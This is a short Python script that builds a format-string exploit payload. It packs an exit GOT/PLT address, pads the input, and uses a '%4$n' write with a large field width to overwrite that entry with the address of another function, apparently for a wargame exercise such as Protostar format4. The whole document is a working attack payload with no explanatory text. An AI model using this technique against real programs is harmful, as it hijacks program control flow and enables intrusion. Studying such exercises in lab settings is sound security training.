import struct

O_FUNC = 0x80484a4
EXIT_PLT = 0x8049838


def pad(s):
        return s + "X" * (536-len(s))


exploit = ""

exploit += struct.pack("I", EXIT_PLT)

exploit += "AAAABBBBCCCC"

exploit += "%4$134513810x "

exploit +=  " %4$n"

print(pad(exploit))